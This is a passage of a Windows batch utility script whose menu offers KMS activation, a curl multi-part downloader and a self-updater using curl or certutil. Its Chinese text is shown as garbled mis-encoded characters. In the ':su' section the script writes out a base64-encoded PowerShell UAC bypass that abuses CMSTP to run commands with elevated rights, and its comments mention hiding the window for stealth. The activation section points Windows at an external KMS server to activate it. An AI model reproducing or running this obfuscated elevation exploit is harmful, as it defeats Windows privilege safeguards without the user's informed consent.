if "%errorlevel%" equ "3" goto memuv2
goto 71
:71.1
cls
set /p =KMS������: <nul
call :colortxt a !server!
echo;
set/p =ϵͳ����: <nul
call :colortxt a "%system:~3%"
echo;
if defined sysid cscript //Nologo %windir%\system32\slmgr.vbs /ipk !%sysid%!
cscript //Nologo %windir%\system32\slmgr.vbs /skms !server!
cscript //Nologo %windir%\system32\slmgr.vbs /ato
start slmgr.vbs -xpr
echo _______________________________________________________________________________
echo �����ʾ����ʧ��[����: 0xC004F074]��Ӧ����KMS������.
echo ����������ز˵�&pause>nul
goto memuv2
:72
title curl���������%system%
cls
if not exist %systemroot%\system32\curl.exe (
if not exist .\curl.exe (echo û���ҵ�curl.exe&timeout /t 2 /nobreak>nul&&goto memuv2))
:72.1
cls
set filename=
set url=
set /p url=������������(e=����): 
if not defined url echo ���Ӳ���Ϊ��!&timeout /t 2 /nobreak>nul&&goto 72.1
if "!url!" equ "e" goto memuv2
set tr=
set /p tr=�������ؽ�����(Ĭ��16): 
if not defined tr set tr=16
set tr|findstr "\<[0-9]*\>">nul
if !errorlevel! neq 0 (echo ֻ����������!&timeout /t 2 /nobreak>nul&&goto 72.1)
set dir=
set /p dir=���뱣��·��(Ĭ�ϵ�ǰDOS����������·��): 
if not defined dir (for /f "delims=" %%a in ("!weizhi!") do (set dir=%%~dpa))
if not exist "!dir!" (echo ·�� !dir! ������&timeout /t 2 /nobreak>nul&goto 72.1)
dir /ad !dir!>nul 2>nul||echo ·�� !dir! ����һ���ļ���&&timeout /t 2 /nobreak>nul&&goto 72.1
cls
echo ��ʼ��ȡ�ļ���Ϣ...
set filename=
if exist %temp%\tag (del /f /q tag)
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;ʹ�ô���:	%%b
		)
	) else (
		set proxy=
	)
)
curl !proxy! -A !ua! -I -# -L -o tag --connect-timeout 5 --output-dir %temp% "!url!"
if not exist %temp%\tag (
echo;_______________________________________________________________________________
set /p =����������ز˵�<nul&pause>nul
goto memuv2
)
for /f "tokens=2 delims= " %%a in ('type %temp%\tag^|findstr /c:"Accept-Ranges:"') do (set trflag=%%a)
for /f "tokens=2 delims= " %%a in ('type %temp%\tag^|findstr /c:"Content-Length:"') do (set filesize=%%a)
for /f "tokens=2 delims==" %%a in ('type %temp%\tag^|findstr /c:"filename="') do (set filename=%%a)
if "!trflag!" neq "bytes" (set tr=1)
del /f /q %temp%\tag
call :xdwjs !filesize! b dw
if not defined filename (set /p filename=�����ļ���: )
if not defined filename (set filename=curl�����ļ�)
set /a fd=!filesize!/!tr!
set /a ys=%filesize%%%tr%
set oldfd=0
set /a pdtr=!tr!-1
set /a newfd=!fd!-1
set /a pdfd=!fd!+!ys!
set file=
for /l %%a in (1,1,!tr!) do (set file=!file!%%a+)
set newtr=
set /a newtr=!tr!+1
set file=!file:~0,-1!
cls
echo �ļ���:		!filename!
echo �ļ���С:	!dw!
if "!trflag!" neq "bytes" (echo;�����Ӳ�֧�ֶ��̴߳���,�������Զ�����Ϊ1)
echo;������:		!tr!
echo;����Ƭ�δ�С:	!fd!+!ys!
echo;����·��:	!dir!
echo;_______________________________________________________________________________
set /p =���������ʼ����<nul&pause>nul
cls
echo;��ʼ�����ļ�...
title curl��������� - �ȴ��ļ��������(��e���ز˵�)%system%
if exist %temp%\down (rd /s /q %temp%\down)
md %temp%\down
set kssj=%time%
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;ʹ�ô���:	%%b
		)
	) else (
		set proxy=
	)
)
for /l %%a in (1,1,!tr!) do (
	start /b curl !proxy! -s -A !ua! -# -L -C - --retry 1 --retry-delay 1 --connect-timeout 5 -r !oldfd!-!newfd! -o %%a --output-dir %temp%\down "!url!"
	set /a oldfd=!newfd!+1
	if %%a equ !pdtr! (
		set newfd=
	) else (
		set /a newfd=!oldfd!+!fd!-1
	)
)
pushd %temp%\down
cls
:72.2
(
cls
set /p =!cswz!s!cswz!0;0H<nul
set jccs=
set jingdu=
set /p =!cswz!0;76H<nul
call :colortxt a �ȴ��ļ��������^(��e���ز˵�^)...
set /p =!cswz!u<nul
)
for /l %%a in (1,1,!tr!) do (
	set ssdx=%%~za
	if not defined ssdx (set ssdx=0)
	if %%a equ !tr! (
		if !ssdx! equ !pdfd! (
			echo;����%%a���
			set /a jccs=!jccs!+1
		) else (
			set fhz=
			call :cf !ssdx! !pdfd! 2 fhz
			set jcjd=!fhz:~2,2!
			if "!jcjd:~0,1!" equ "0" (
				set jcjd=!jcjd:~1,1!
			)
			set jdt=
			for /l %%c in (1,2,!jcjd!) do (
				set jdt=!jdt!:
			)
			set /p =����%%a�Ľ���:	[<nul
			call :colortxt a !jdt!
			echo;][!fhz!~1]
		)
	) else (
		if !ssdx! equ !fd! (
			echo;����%%a���
			set /a jccs=!jccs!+1
		) else (
			set fhz=
			call :cf !ssdx! !fd! 2 fhz
			set jcjd=!fhz:~2,2!
			if "!jcjd:~0,1!" equ "0" (
				set jcjd=!jcjd:~1,1!
			)
			set jdt=
			for /l %%c in (1,2,!jcjd!) do (
				set jdt=!jdt!:
			)
			set /p =����%%a�Ľ���:	[<nul
			call :colortxt a !jdt!
			echo;][!fhz!~1]
		)
	)
)
choice /c 1e /t 1 /d 1 >nul
if "!errorlevel!" equ "2" (
	taskkill /im curl.exe /f
	rd /s /q %temp%\down
	popd
	goto memuv2
)
if !jccs! neq !tr! goto 72.2
set jssj=%time%
cls
echo;�ϲ��ļ���...
if "!dir:~-1!" neq "\" (set dir=!dir!\)
copy /b /z !file! "!dir!!filename!"
rd /s /q %temp%\down
popd
cls
title curl���������%system%
if exist "!dir!!filename!" (
for /f "delims=" %%a in ("!dir!!filename!") do (
call :sjc %kssj% %jssj%
set xzsd=
if "!jgxs:~0,1!" equ "0" (
	set jgxs=!jgxs:~1,1!
)
if "!jgfen:~0,1!" equ "0" (
	set jgfen=!jgfen:~1,1!
)
if "!jgm:~0,1!" equ "0" (
	set jgm=!jgm:~1,1!
)
set /a xzsd=!jgxs!*3600+!jgfen!*60+!jgm!
set xzsd=!xzsd!.!jghm!
echo;���������ٶ�...
for /f "delims=" %%a in ('powershell !filesize!/!xzsd!') do (call :xdwjs %%a d dw)
forfiles /p %~dp0 /m %~nx0 /c "%comspec% /c set /p =0x07<nul"
cls
echo;�������
echo;����:		!url!
echo;��ʱ:		!jgxs!Сʱ!jgfen!����!jgm!.!jghm!��
echo;ƽ�������ٶ�:  !size! !dw!/s
echo;�ļ�:		%%~nxa
if %%~za geq 1024 (
call :xdwjs %%~za b dw
echo;�ļ���С:	%%~za�ֽ� Լ!dw!) else (echo �ļ���С:	%%~za�ֽ�)
echo;����·��:	%%~dpa
)) else (
forfiles /p %~dp0 /m %~nx0 /c "%comspec% /c set /p =0x07<nul"
timeout /t 1 /nobreak>nul
forfiles /p %~dp0 /m %~nx0 /c "%comspec% /c set /p =0x07<nul"
cls
echo;����:	!url!
echo;����ʧ��)
echo;_______________________________________________________________________________
set /p =����������ز˵�<nul&pause>nul
goto memuv2
:hash
setlocal
set "url=%1"
set "shuanfa=%2"
if "!shuanfa!" equ "" (set "shuanfa=sha256")
for /f "skip=1 eol=C" %%a in ('"certutil -hashfile !url! !shuanfa!"') do (
	if "%3" neq "" (
		endlocal&set "%3=%%a"
		goto :eof
	) else (
		echo;%%a
		goto :eof
	)
	
)
goto :eof
::for /f "delims=" %%a in ('"powershell get-filehash %url% -algorithm %shuanfa%^|select-object hash^|format-list"') do (set hash=%%a)
::set hash=%hash:~7%
goto :eof
:powershell
powershell -mta -nologo -noprofile -executionpolicy bypass -file "%temp%\powershell.ps1"
goto :eof
:update
setlocal
cls
title ����DOS������ - ��ǰ�汾: %ver%%system%
echo ������°汾...
timeout /t 1 /nobreak>nul
if exist %temp%\dostoolupdate (
	del /f /q %temp%\dostoolupdate>nul 2>nul
)
if exist %systemroot%\system32\curl.exe (
	pushd %temp%
	for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
		if "%%a" equ "0x1" (
			for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
				set "proxy=-x %%b"
				echo;ʹ�ô���:	%%b
			)
		) else (
			set proxy=
		)
	)
	echo;ʹ������:	!gxurlhost1!
	echo;Host����:	!githost:~10,-1!
	curl !proxy! !githost! -A !ua! -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 5 !resolve! -o dostoolupdate !gxurlhost1!
	if exist "%temp%\dostoolupdate" (
		for /f "delims=: tokens=1,2" %%a in (%temp%\dostoolupdate) do (
			set "gxver=%%a"
			set "doshash=%%b"
			set "host=!githost!"
			set "resolve=!resolve!"
			set "url=!gxdoshost1!"
		)
		popd
		goto updatecheck
	) else (
		echo;ʹ������:	!gxurl1!
		curl !proxy! -A !ua! -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 5 -o dostoolupdate !gxurl1!
		if exist "%temp%\dostoolupdate" (
			for /f "delims=: tokens=1,2" %%a in (%temp%\dostoolupdate) do (
				set "gxver=%%a"
				set "doshash=%%b"
				set "host="
				set "resolve="
				set "url=!gxdos1!"
			)
			popd
			goto updatecheck
		) else (
			echo;ʹ������:	!gxurlhost2!
			echo;Host����:	!jshost:~10,-1!
			curl !proxy! !jshost! -A !ua! -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 5 !resolve! -o dostoolupdate !gxurlhost2!
			if exist "%temp%\dostoolupdate" (
				for /f "delims=: tokens=1,2" %%a in (%temp%\dostoolupdate) do (
					set "gxver=%%a"
					set "doshash=%%b"
					set "host=!jshost!"
					set "resolve=!resolve!"
					set "url=!gxdoshost2!"
				)
				popd
				goto updatecheck
			) else (
				echo;ʹ������:	!gxurl2!
				curl !proxy! -A !ua! -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 5 -o dostoolupdate !gxurl2!
				if exist "%temp%\dostoolupdate" (
					for /f "delims=: tokens=1,2" %%a in (%temp%\dostoolupdate) do (
						set "gxver=%%a"
						set "doshash=%%b"
						set "host="
						set "resolve="
						set "url=!gxdos2!"
					)
					popd
					goto updatecheck
				) else (
					endlocal
					echo;û�м�鵽���°汾
					echo;_______________________________________________________________________________
					echo;����������ز˵�&pause>nul
					if "!tzwz!" equ "!start!" (
						goto memuv2
					) else (
						goto !tzwz!
					)
				)
			)
		)
	)
) else (
	echo;ʹ������:	!gxurl1!
	certutil -urlcache -split -f !gxurl1! %temp%\dostoolupdate
	if exist "%temp%\dostoolupdate" (
		for /f "delims=: tokens=1,2" %%a in (%temp%\dostoolupdate) do (
			set "gxver=%%a"
			set "doshash=%%b"
			set "url=!gxdos1!"
		)
		goto updatecheck
	) else (
		echo;ʹ������:	!gxurl2!
		certutil -urlcache -split -f !gxurl2! %temp%\dostoolupdate
		if exist "%temp%\dostoolupdate" (
			for /f "delims=: tokens=1,2" %%a in (%temp%\dostoolupdate) do (
				set "gxver=%%a"
				set "doshash=%%b"
				set "url=!gxdos2!"
			)
			goto updatecheck
		) else (
			endlocal
			echo;û�м�鵽���°汾
			echo;_______________________________________________________________________________
			echo;����������ز˵�&pause>nul
			if "!tzwz!" equ "!start!" (
				goto memuv2
			) else (
				goto !tzwz!
			)
		)
	)
)
:updatecheck
cls
set /a "checkver=gxver-ver"
if !checkver! gtr 0 (
	set /p =��鵽���°汾: <nul
	call :colortxt a !gxver!
	echo;
	goto startupdate
) else (
	endlocal
	echo;û�м�鵽���°汾
	echo;_______________________________________________________________________________
	echo;����������ز˵�&pause>nul
	if "!tzwz!" equ "!start!" (
		goto memuv2
	) else (
		goto !tzwz!
	)
)
:startupdate
echo �������ظ���...
timeout /t 1 /nobreak>nul
if exist %temp%\dostool (
	del /f /q %temp%\dostool>nul 2>nul
)
if exist %systemroot%\system32\curl.exe (
	pushd %temp%
	for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
		if "%%a" equ "0x1" (
			for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
				set "proxy=-x %%b"
				echo;ʹ�ô���:	%%b
			)
		) else (
			set proxy=
		)
	)
	echo;ʹ������:	!url!
	if defined host (
		echo;Host����:	%host:~10,-1%
	)
	curl !proxy! !host! -A !ua! -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 5 !resolve! -o dostool !url!
	popd
	call :hash %temp%\dostool sha1
	if /i "!hash!" equ "!doshash!" (
		endlocal
		copy /z /y %temp%\dostool %weizhi%&goto chushihua
	) else (
		call :colortxt c �ļ���Ч
		echo;
		timeout /t 2 /nobreak>nul
		if "!tzwz!" equ "!start!" (
			goto memuv2
		) else (
			goto !tzwz!
		)
	)
) else (
	certutil -urlcache -split -f !url! %temp%\dostool
	call :hash %temp%\dostool sha1
	if /i "!hash!" equ "!doshash!" (
		endlocal
		copy /z /y %temp%\dostool %weizhi%&goto chushihua
	) else (
		call :colortxt c �ļ���Ч
		echo;
		timeout /t 2 /nobreak>nul
		if "!tzwz!" equ "!start!" (
			goto memuv2
		) else (
			goto !tzwz!
		)
	)
)
::bitsadmin /transfer ���ظ�����... /priority FOREGROUND https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/dostool.js %weizhi%&start %comspec% /c %0&exit 0
:sjc
set kssj=%1
set jssj=%2
set kssj=%kssj:"=%
set kssj=%kssj: =0%
set kssj=%kssj::=%
set kssj=%kssj:.=%
set jssj=%jssj:"=%
set jssj=%jssj: =0%
set jssj=%jssj::=%
set jssj=%jssj:.=%
set xs=%kssj:~0,2%
set xs1=%jssj:~0,2%
set fen=%kssj:~2,2%
set fen1=%jssj:~2,2%
set miao=%kssj:~4,2%
set miao1=%jssj:~4,2%
set hm=%kssj:~6,2%
set hm1=%jssj:~6,2%
if %xs% lss 10 if %xs% gtr 07 set xs=%xs:0=%
if %xs1% lss 10 if %xs1% gtr 07 set xs1=%xs1:0=%
if %fen% lss 10 if %fen% gtr 07 set fen=%fen:0=%
if %fen1% lss 10 if %fen1% gtr 07 set fen1=%fen1:0=%
if %miao% lss 10 if %miao% gtr 07 set miao=%miao:0=%
if %miao1% lss 10 if %miao1% gtr 07 set miao1=%miao1:0=%
if %hm% lss 10 if %hm% gtr 07 set hm=%hm:0=%
if %hm1% lss 10 if %hm1% gtr 07 set hm1=%hm1:0=%
if %hm1% lss %hm% set/a miao1=%miao1%-1&set/a hm1=%hm1%+100
set/a jghm=%hm1%-%hm%
if %miao1% lss %miao% set/a fen1=%fen1%-1&set/a miao1=%miao1%+60
set/a jgm=%miao1%-%miao%
if %fen1% lss %fen% set/a jgxs1=%jgxs1%-1&set/a fen1=%fen1%+60
set/a jgfen=%fen1%-%fen%
set/a jgxs=%xs1%-%xs%
if %jghm% lss 10 set jghm=0%jghm%
if %jgm% lss 10 set jgm=0%jgm%
if %jgfen% lss 10 set jgfen=0%jgfen%
if %jgxs% lss 10 set jgxs=0%jgxs%
set sjc=
set sjc=%jgxs%%jgfen%%jgm%%jghm%
goto :eof
:zfccda
set zfcgs=0
set zfc=
set zfc=%1
:zfcxh
if "!zfc:~%zfcgs%,1!" equ "" (
	set /a zfcgs-=2
	goto :eof
) else (
	set /a zfcgs+=1
	goto zfcxh
)
goto :eof
:zfccd
set zfc=
set zfc=%1
for /l %%a in (1,1,1000) do (
	if "!zfc:~%%a,1!" equ "" (
		set /a zfcgs=%%a-2
		goto :eof
	) 
)
goto :eof
:strlen
setlocal
set "$=!%1!#"
set N=&for %%a in (4096 2048 1024 512 256 128 64 32 16)do if !$:~%%a!. NEQ . set/aN+=%%a&set $=!$:~%%a!
set $=!$!fedcba9876543210&set/aN+=0x!$:~16,1!
endlocal&If %2. neq . (set/a%2=%N%)else echo %N%
goto :eof
:ys
setlocal
for /f "tokens=1,2,3,4 delims=:." %%a in ("!time!") do (
	set /a "start=1%%a*360000+1%%b*6000+1%%c*100+1%%d"
)
:ys_loop
for /f "tokens=1,2,3,4 delims=:." %%a in ("!time!") do (
	set /a "sub=(1%%a*360000+1%%b*6000+1%%c*100+1%%d)-start"
)
if "!sub!" lss "0" (
	goto :eof
) else (
	if !sub! geq %1 (
		goto :eof
	) else (
		goto ys_loop
	)
)
goto :eof
:dwjs
set blxsws=%3
if not defined blxsws set blxsws=2
set dw=%2
if not defined dw set dw=0
set size=%1
if not defined size goto :eof
set size|findstr "\<[0-9]*\>">nul
if "%errorlevel%" neq "0" goto :eof
:renjs
for /f "delims=" %%a in ('"powershell %size%/1024"') do (set /a dw=%dw%+1&set size=%%a)
set size|findstr "\<0[.]">nul
if "%errorlevel%" equ "0" (set /a dw=%dw%-1
for /f "delims=" %%a in ('"powershell %size%*1024"') do (set size=%%a)
goto next
)
if "%size%" geq "1024" goto renjs
:next
if "%dw%" equ "0" set dw=�ֽ�
if "%dw%" equ "1" set dw=KB
if "%dw%" equ "2" set dw=MB
if "%dw%" equ "3" set dw=GB
if "%dw%" equ "4" set dw=TB
if "%dw%" equ "5" set dw=EB
if "%size%" equ "0" set size=
echo !size!|findstr /c:".">nul
if !errorlevel! equ 0 (for /f "tokens=1,2 delims=." %%a in ("!size!") do (
for /f "delims=" %%b in ('powershell '{0:f!blxsws!}' -f !size!') do (set size=%%b)
))
goto :eof
:list
(
set start=1
set a1=���U�����lpk.dll����
set a2=���U�����jwgkvsq.vmx�����������߸ò���
set a3=����ϵͳ����
set a4=��ʾϵͳ��Ϣ
set a5=������������������
set a6=��ʾ�������ļ�^(���˸��ಡ����^)
set a7=���ע�������
set a8=���㿪ƽ��
set a9=�л���������ʾ��
set a10=�����̸�ʽת��ΪNTFS
set a11=���̴����޸�
set a12=��ʽ��
set a13=DOS������
set a14=���������ʾ��������
set a15=�����������
set a16=���KHATRA����
set a17=��ע���
set a18=�򿪿������
set a19=��DirectX��Ϲ���
set a20=�򿪼��������
set a21=�û�����
set a22=�������
set a23=DOS���������
set a24=�ļ�ϵͳ��Ϣ��ѯ
set a25=����ָ����С���ļ�
set a26=����U�̲���
set a27=������Ƭ����
set a28=һ��ɾ�����ļ���
set a29=ping���������ӳ�
set a30=Ӳ�����
set a31=������
set a32=DOS����
set a33=��ʱ��
set a34=�������������
set a35=ɾ��ÿ���̷��µ�System Volume Information�ļ���
set a36=������ת����
set a37=�ı����
set a38=��ʾ��������û�������
set a39=NTFSѹ��
set a40=�޸��ļ�Ȩ��
set a41=��ʾ����������
set a42=�����Ķ���
set a43=�������ļ����շ���
set a44=�ļ�����
set a45=�޸����𻵵��ļ�
set a46=�����ƽ�ѹ��������
set a47=Wifi�ȵ�
set a48=������chm�ļ�
set a49=�ر�����Ӧ����
set a50=�ļ��Ƚ���
set a51=������д����а�
set a52=��ϵͳ��������
set a53=��֪�����ռ�������
set a54=��ѯϵͳ����״̬
set a55=����ָ���ļ��Ŀ�ݷ�ʽ������
set a56=��ϵͳ����
set a57=����ͳ��
set a58=������������
set a59=�򿪹������̨
set a60=���Streams�ļ�����
set a61=������ɾ�����г���װ���
set a62=ע�������
set a63=Base64�����
set a64=8.3���ļ�������
set a65=����NTFSѹ��
set a66=�����ļ���ϣֵ
set a67=��ʾ���һ���
set a68=���������̷�
set a69=��ѹmsi��װ�ļ�
set a70=����CMD����̨ɫ�ʱ�
set a71=KMS����Windows
set a72=curl���������
set a73=����ǰ�ò�������Chromium�������
)
goto :eof
:colortxt
if !winv! equ 0 goto colortxt2
set bj=%1
if "!bj:~1,1!" equ "" (set bj1=!color!&set bj2=!bj!) else (set bj1=!bj:~0,1!&set bj2=!bj:~1,1!)
verify on
pushd %temp%
set /p =%cswz1%<nul>"%2"
findstr /v /a:!bj1!!bj2! /r "^$" "%2" nul
del /f "%2">nul 2>nul
popd
goto :eof
:colortxt2
set bj=%1
set zt=%2
if "!bj:~0,1!" equ "0" set bj1=40;
if "!bj:~0,1!" equ "4" set bj1=41;
if "!bj:~0,1!" equ "2" set bj1=42;
if "!bj:~0,1!" equ "6" set bj1=43;
if "!bj:~0,1!" equ "1" set bj1=44;
if "!bj:~0,1!" equ "5" set bj1=45;
if "!bj:~0,1!" equ "3" set bj1=46;
if "!bj:~0,1!" equ "7" set bj1=47;
if "!bj:~0,1!" equ "8" set bj2=90m
if "!bj:~0,1!" equ "c" set bj2=91m
if "!bj:~0,1!" equ "a" set bj2=92m
if "!bj:~0,1!" equ "e" set bj2=93m
if "!bj:~0,1!" equ "9" set bj2=94m
if "!bj:~0,1!" equ "d" set bj2=95m
if "!bj:~0,1!" equ "b" set bj2=96m
if "!bj:~0,1!" equ "f" set bj2=97m
if "!bj:~1,1!" equ "8" set bj2=90m
if "!bj:~1,1!" equ "c" set bj2=91m
if "!bj:~1,1!" equ "a" set bj2=92m
if "!bj:~1,1!" equ "e" set bj2=93m
if "!bj:~1,1!" equ "9" set bj2=94m
if "!bj:~1,1!" equ "d" set bj2=95m
if "!bj:~1,1!" equ "b" set bj2=96m
if "!bj:~1,1!" equ "f" set bj2=97m
if "!bj:~1,1!" equ "" set bj1=!ysbak:~0,3!
set /p =!cswz!!bj1!!bj2!!zt!!cswz!!ysbak!<nul
goto :eof
:rgb
set brgb=%1
set qrgb=%2
set zt=%3
set brgb=!brgb:.=;!
set qrgb=!qrgb:.=;!
set /p =!cswz!48;2;!brgb!;38;2;!qrgb!m!zt!!cswz!!ysbak!<nul
goto :eof
:su
for /f "delims=" %%a in ('"dir/a/b "%weizhi%""') do (set exe="%%~dpnxa")
(
echo IyBVQUMgQnlwYXNzIHBvYyB1c2luZyBTZW5kS2V5cw0KIyBWZXJzaW9uIDEuMA0K
echo IyBBdXRob3I6IE9kZHZhciBNb2UNCiMgRnVuY3Rpb25zIGJvcnJvd2VkIGZyb206
echo IGh0dHBzOi8vcG93ZXJzaGVsbC5vcmcvZm9ydW1zL3RvcGljL3NlbmRrZXlzLw0K
echo IyBUb2RvOiBIaWRlIHdpbmRvdyBvbiBzY3JlZW4gZm9yIHN0ZWFsdGgNCiMgVG9k
echo bzogTWFrZSBzY3JpcHQgZWRpdCB0aGUgSU5GIGZpbGUgZm9yIGNvbW1hbmQgdG8g
echo aW5qZWN0Li4uDQoNCg0KRnVuY3Rpb24gc2NyaXB0OlNldC1JTkZGaWxlIHsNCltD
echo bWRsZXRCaW5kaW5nKCldDQoJUGFyYW0gKA0KCVtQYXJhbWV0ZXIoSGVscE1lc3Nh
echo Z2U9IlNwZWNpZnkgdGhlIElORiBmaWxlIGxvY2F0aW9uIildDQoJJEluZkZpbGVM
echo b2NhdGlvbiA9ICIkZW52OnRlbXBcQ01TVFAuaW5mIiwNCgkNCglbUGFyYW1ldGVy
echo KEhlbHBNZXNzYWdlPSJTcGVjaWZ5IHRoZSBjb21tYW5kIHRvIGxhdW5jaCBpbiBh
echo IFVBQy1wcml2aWxlZ2VkIHdpbmRvdyIpXQ0KCVtTdHJpbmddJENvbW1hbmRUb0V4
echo ZWN1dGUgPSAn
)>%temp%\1.base
(
echo Jw0KCSkNCg0KJEluZkNvbnRlbnQgPSBAIg0KW3ZlcnNpb25dDQpTaWduYXR1cmU9
echo YCRjaGljYWdvYCQNCkFkdmFuY2VkSU5GPTIuNQ0KDQpbRGVmYXVsdEluc3RhbGxd
echo DQpDdXN0b21EZXN0aW5hdGlvbj1DdXN0SW5zdERlc3RTZWN0aW9uQWxsVXNlcnMN
echo ClJ1blByZVNldHVwQ29tbWFuZHM9UnVuUHJlU2V0dXBDb21tYW5kc1NlY3Rpb24N
echo Cg0KW1J1blByZVNldHVwQ29tbWFuZHNTZWN0aW9uXQ0KOyBDb21tYW5kcyBIZXJl
echo IHdpbGwgYmUgcnVuIEJlZm9yZSBTZXR1cCBCZWdpbnMgdG8gaW5zdGFsbA0KJENv
echo bW1hbmRUb0V4ZWN1dGUNCnRhc2traWxsIC9JTSBjbXN0cC5leGUgL0YNCg0KW0N1
echo c3RJbnN0RGVzdFNlY3Rpb25BbGxVc2Vyc10NCjQ5MDAwLDQ5MDAxPUFsbFVTZXJf
echo TERJRFNlY3Rpb24sIDcNCg0KW0FsbFVTZXJfTERJRFNlY3Rpb25dDQoiSEtMTSIs
echo ICJTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxBcHAg
echo UGF0aHNcQ01NR1IzMi5FWEUiLCAiUHJvZmlsZUluc3RhbGxQYXRoIiwgIiVVbmV4
echo cGVjdGVkRXJyb3IlIiwgIiINCg0KW1N0cmluZ3NdDQpTZXJ2aWNlTmFtZT0iQ29y
echo cFZQTiINClNob3J0U3ZjTmFtZT0iQ29ycFZQTiINCg0KIkANCg0KJEluZkNvbnRl
echo bnQgfCBPdXQtRmlsZSAkSW5mRmlsZUxvY2F0aW9uIC1FbmNvZGluZyBBU0NJSQ0K
echo fQ0KDQoNCkZ1bmN0aW9uIEdldC1Id25kDQp7DQogIFtDbWRsZXRCaW5kaW5nKCld
echo DQogICAgDQogIFBhcmFtDQogICgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
echo ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUp
echo XSBbc3RyaW5nXSAkUHJvY2Vzc05hbWUNCiAgKQ0KICBQcm9jZXNzDQogICAgew0K
echo ICAgICAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1N0b3AnDQogICAgICAg
echo IFRyeSANCiAgICAgICAgew0KICAgICAgICAgICAgJGh3bmQgPSBHZXQtUHJvY2Vz
echo cyAtTmFtZSAkUHJvY2Vzc05hbWUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9w
echo ZXJ0eSBNYWluV2luZG93SGFuZGxlDQogICAgICAgIH0NCiAgICAgICAgQ2F0Y2gg
echo DQogICAgICAgIHsNCiAgICAgICAgICAgICRod25kID0gJG51bGwNCiAgICAgICAg
echo fQ0KICAgICAgICAkaGFzaCA9IEB7DQogICAgICAgIFByb2Nlc3NOYW1lID0gJFBy
echo b2Nlc3NOYW1lDQogICAgICAgIEh3bmQgICAgICAgID0gJGh3bmQNCiAgICAgICAg
echo fQ0KICAgICAgICANCiAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQc09iamVjdCAt
echo UHJvcGVydHkgJGhhc2gNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIFNldC1XaW5kb3dB
echo Y3RpdmUNCnsNCiAgW0NtZGxldEJpbmRpbmcoKV0NCg0KICBQYXJhbQ0KICAoDQog
echo ICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxp
echo bmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0gW3N0cmluZ10gJE5hbWUNCiAgKQ0K
echo ICANCiAgUHJvY2Vzcw0KICB7DQogICAgJG1lbWJlckRlZmluaXRpb24gPSBAJw0K
echo ICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gcHVibGljIHN0YXRpYyBleHRl
echo cm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0K
echo ICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVl
echo KV0gcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRGb3JlZ3JvdW5kV2luZG93
echo KEludFB0ciBoV25kKTsNCg0KJ0ANCg0KICAgIEFkZC1UeXBlIC1NZW1iZXJEZWZp
echo bml0aW9uICRtZW1iZXJEZWZpbml0aW9uIC1OYW1lIEFwaSAtTmFtZXNwYWNlIFVz
echo ZXIzMg0KICAgICRod25kID0gR2V0LUh3bmQgLVByb2Nlc3NOYW1lICROYW1lIHwg
echo U2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSHduZA0KICAgIElmICgkaHdu
echo ZCkgDQogICAgew0KICAgICAgJG9uVG9wID0gTmV3LU9iamVjdCAtVHlwZU5hbWUg
echo U3lzdGVtLkludFB0ciAtQXJndW1lbnRMaXN0ICgwKQ0KICAgICAgW1VzZXIzMi5B
echo cGldOjpTZXRGb3JlZ3JvdW5kV2luZG93KCRod25kKQ0KICAgICAgW1VzZXIzMi5B
echo cGldOjpTaG93V2luZG93KCRod25kLCA1KQ0KICAgIH0NCiAgICBFbHNlIA0KICAg
echo IHsNCiAgICAgIFtzdHJpbmddICRod25kID0gJ04vQScNCiAgICB9DQoNCiAgICAk
echo aGFzaCA9IEB7DQogICAgICBQcm9jZXNzID0gJE5hbWUNCiAgICAgIEh3bmQgICAg
echo PSAkaHduZA0KICAgIH0NCiAgICAgICAgDQogICAgTmV3LU9iamVjdCAtVHlwZU5h
echo bWUgUHNPYmplY3QgLVByb3BlcnR5ICRoYXNoDQogIH0NCn0NCg0KLiBTZXQtSU5G
echo RmlsZQ0KI05lZWRzIFdpbmRvd3MgZm9ybXMNCmFkZC10eXBlIC1Bc3NlbWJseU5h
